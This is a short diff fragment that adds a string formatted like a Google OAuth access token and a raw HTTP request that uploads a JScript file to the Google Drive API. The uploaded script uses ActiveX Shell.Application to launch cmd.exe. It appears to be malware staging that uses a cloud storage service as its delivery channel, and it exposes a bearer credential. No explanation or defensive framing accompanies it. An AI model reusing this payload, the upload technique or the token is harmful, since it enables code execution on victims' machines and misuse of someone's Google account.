@@ -1,0 +1,11 @@
+ya29.a0AbVbY6Pi-LtygxS1Jo811extnuSSX-fh8xisaNcQSHSoPd55ZX_BIWNraADSCXDxYlNMXwcgWshgEEdJGD-G1t2GYGDvMGFW5dOmLvXD8TO3UUZl_UF54X8lC-fNteO_pnS2r6qu1_8VWIgdYhHFD11-Ot5Em5QaCgYKAa4SARESFQFWKvPlETYC5JffLAZ03ERv2a3g5g0166
+
+
+POST /upload/drive/v3/files?uploadType=multipart HTTP/1.1
+Host: www.googleapis.com
+Content-length: 134
+Content-type: text/javascript
+Authorization: Bearer 
+var seaShell = new ActiveXObject("Shell.Application");
+var action = "cmd.exe";
+seaShell.ShellExecute(action, "", "", "open", "1");
